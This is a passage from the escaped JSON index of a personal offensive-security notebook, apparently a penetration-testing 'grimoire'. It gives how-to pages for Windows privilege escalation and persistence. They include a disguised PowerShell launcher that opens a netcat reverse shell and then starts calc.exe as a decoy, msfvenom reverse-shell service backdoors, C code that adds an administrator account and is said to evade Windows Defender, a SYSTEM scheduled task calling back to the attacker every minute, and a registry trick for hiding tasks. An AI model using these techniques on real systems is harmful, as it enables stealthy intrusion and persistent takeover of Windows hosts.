data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create a reverse shell (note that netcat is something that&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the attacker need to provide themselves!)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Start-Process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;NoNewWindow &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;C:\\Windows\\System32\\nc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-e cmd.exe 1.2.3.4 1337&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Fire off the application the user is expecting&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;calc.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;To ensure that the script itself doesn’t generate a PowerShell window, it will need to be called like so:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;powershell.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;WindowStyle &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;hidden&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; C:\\Windows\\System32\\calc.ps1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Exploit-Windows-tasks":{"slug":"spells/Exploit-Windows-tasks","filePath":"spells/Exploit Windows tasks.md","title":"Exploit Windows tasks","links":["spells/Exploit-local-Windows-tasks","spells/Exploit-remote-Windows-tasks"],"tags":["OS/Windows/Tasks","AttackCycle/Exploitation","AttackCycle/LateralMovement","HowTo"],"content":"Use the built-in schtasks.exe command to create and manipulate Windows tasks (basically the equivalent of *NIX cron jobs).\nLocal tasks\nTransclude of Exploit-local-Windows-tasks\nRemote tasks\nTransclude of Exploit-remote-Windows-tasks","richContent":"&lt;p&gt;Use the built-in &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;schtasks.exe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; command to create and manipulate Windows tasks (basically the equivalent of *NIX cron jobs).&lt;/p&gt;\n&lt;h2 id=&quot;local-tasks&quot;&gt;Local tasks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#local-tasks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-local-Windows-tasks&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit local Windows tasks&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-local-Windows-tasks&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-local-Windows-tasks&quot;&gt;Transclude of Exploit-local-Windows-tasks&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;remote-tasks&quot;&gt;Remote tasks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remote-tasks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-remote-Windows-tasks&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit remote Windows tasks&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-remote-Windows-tasks&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-remote-Windows-tasks&quot;&gt;Transclude of Exploit-remote-Windows-tasks&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Exploit-local-Windows-services":{"slug":"spells/Exploit-local-Windows-services","filePath":"spells/Exploit local Windows services.md","title":"Exploit local Windows services","links":["spells/Windows-services","spells/msfvenom","spells/Windows-event-logs","spells/Unquoted-path-handling-in-Windows"],"tags":["OS/Windows/Services","AttackCycle/Exploitation","Application/Metasploit/msfvenom","OS/Windows/EventLog","HowTo"],"content":"Existing Windows services can have backdoors added to them using Metasploit’s msfvenom. Begin by finding a candidate service:\n# Get a list of all available services\n#\nsc.exe query state=all\n \n# Query information about an existing service. We want a\n# service with three properties:\n#\n#    1. The BINARY_PATH_NAME points to our payload,\n#    2. The START_TYPE is &quot;auto&quot; so it runs without user\n#       interaction, and\n#    3. The SERVICE_START_NAME (the account which the service\n#       runs under) is &quot;LocalSystem&quot;.\n#\n# Note that not every service can be queried, however; the\n# ability to do so is controlled by a special per-service\n# permission (a Discressionary Access Control List, or DACL).\n#\nsc.exe qc $SERVICE_NAME\nCreate a replacement service file using msfvenom (alternately, a backdoor could be added directly to the binary):\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n\tLHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \\\n\t-f exe-service -o $SERVICE_EXE\nThe use of exe-service here rather than exe ensures that the correct APIs are available. Alternately, if you’re not trying to be stealthy than a simple application can be used instead (this will run successfully, but register as a failure in the Windows event logs).\n#include &lt;stdlib.h&gt;\n \nint main() {\n\tint i;\n \n\ti = system(&quot;net user USERNAME PASSWORD /add&quot;);\n\ti = system(&quot;net localgroup administrators USERNAME /add&quot;);\n \n\treturn 0;\n}\nUSERNAME and PASSWORD obviously need to be updated to fit the current use case. Unlike msfvenom payloads, as of August 17th 2022 binaries compiled from this code are not detected as malicious by Windows Defender.\nFinally, update the service definition:\n# NOTE: A space is required after equals signs for this\n# command! It&#039;s not just a weird typo below!\n#\nsc.exe config $SERVICE_NAME `\n\tbinPath= &quot;$PATH_TO_REVERSE_SHELL_EXE&quot; `\n\tstart= auto obj= &quot;LocalSystem&quot;`\nIf the service executable is specified with an unquoted path, then it’s only necessary to place the malicious binary earlier in the implicit search path.","richContent":"&lt;p&gt;Existing &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-services&quot;&gt;Windows services&lt;/a&gt; can have backdoors added to them using Metasploit’s &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt;. Begin by finding a candidate service:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get a list of all available services&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; query state&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;all&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Query information about an existing service. We want a&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# service with three properties:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#    1. The BINARY_PATH_NAME points to our payload,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#    2. The START_TYPE is &quot;auto&quot; so it runs without user&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#       interaction, and&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#    3. The SERVICE_START_NAME (the account which the service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#       runs under) is &quot;LocalSystem&quot;.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Note that not every service can be queried, however; the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# ability to do so is controlled by a special per-service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# permission (a Discressionary Access Control List, or DACL).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; qc &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVICE_NAME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Create a replacement service file using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; (alternately, a backdoor could be added directly to the binary):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; windows/x64/shell_reverse_tcp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tLHOST=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; LPORT=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;\t-f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; exe-service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SERVICE_EXE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The use of &lt;code&gt;exe-service&lt;/code&gt; here rather than &lt;code&gt;exe&lt;/code&gt; ensures that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-services&quot;&gt;the correct APIs&lt;/a&gt; are available. Alternately, if you’re not trying to be stealthy than a simple application can be used instead (this will run successfully, but register as a failure in the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-logs&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-event-logs&quot;&gt;Windows event logs&lt;/a&gt;).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdlib.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;int&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; main&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\ti &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;net user USERNAME PASSWORD /add&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\ti &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; system&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;net localgroup administrators USERNAME /add&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\treturn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;USERNAME and PASSWORD obviously need to be updated to fit the current use case. Unlike &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; payloads, as of August 17th 2022 binaries compiled from this code are &lt;em&gt;not&lt;/em&gt; detected as malicious by Windows Defender.&lt;/p&gt;\n&lt;p&gt;Finally, update the service definition:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# NOTE: A space is required after equals signs for this&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# command! It&#039;s not just a weird typo below!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; config &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVICE_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tbinPath&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;PATH_TO_REVERSE_SHELL_EXE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tstart&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; auto obj&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;LocalSystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;If the service executable is specified with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Unquoted-path-handling-in-Windows&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Unquoted-path-handling-in-Windows&quot;&gt;unquoted path&lt;/a&gt;, then it’s only necessary to place the malicious binary earlier in the implicit search path.&lt;/p&gt;"},"spells/Exploit-local-Windows-tasks":{"slug":"spells/Exploit-local-Windows-tasks","filePath":"spells/Exploit local Windows tasks.md","title":"Exploit local Windows tasks","links":[],"tags":["OS/Windows/Tasks","AttackCycle/Exploitation","Application/PsExec","OS/Windows/Registry","AttackCycle/AntiForensics","HowTo","Application/icacls"],"content":"# List scheduled tasks\n#\nschtasks\n \n# View details about a scheduled task\n#\nschtasks /query /tn $TASK_NAME /fo list /v\n \n# Check the permissions of an executable\n#\nicacls $PATH_TO_BINARY\n \n# Modify the permissions (if possible/desired)\n#\nicacls $PATH_TO_BINARY /grant $GROUP:$PERMISSION\n \n# You can overwrite files in Windows in the same way you&#039;d do\n# in Linux (however, this can cause issues with line\n# endings... probably best to just use notepad.exe here\n# instead)\n#\necho $MALICIOUS_BINARY_AND_ARGUMENTS &gt; $PATH_TO_BAT_TO_OVERWRITE\n \n# Force a task to run (iff the current user has permission to\n# do so)\n#\nschtasks /run /tn $TASK_NAME\nIf a task points to a file that you’ve obtained write access to, then that file can be altered without changing the underlying task.\nIt may also be possible to create your own tasks.\n# Creates a task that executes a netcat reverse shell back to\n# the attacker. &quot;/sc&quot; and &quot;/mo&quot; indicate that the task should\n# be run every minute. &quot;/ru&quot; indicates that the task will run\n# with SYSTEM privileges.\n#\nschtasks /create /sc minute /mo 1 /tn $TASK_NAME `\n\t/tr &quot;$NETCAT_PATH -e cmd.exe $ATTACKER_IP $ATTACKER_PORT&quot; `\n\t/ru SYSTEM\n \n# Checks to see if the task was created successfully.\n#\nschtasks /query /tn $TASK_NAME\nStealthy tasks\nDeleting the task Security Descriptor will make the task invisible to any user in the system. Note that this requires PsExec!\n\n\nUse PsExec64.exe -s -i regedit to open regedit with SYSTEM privileges.\n\n\nSearch in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ for the task to hide. Under the key for that task, there will be a value named SD that contains the security descriptor. Simply delete it.\n\n","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span 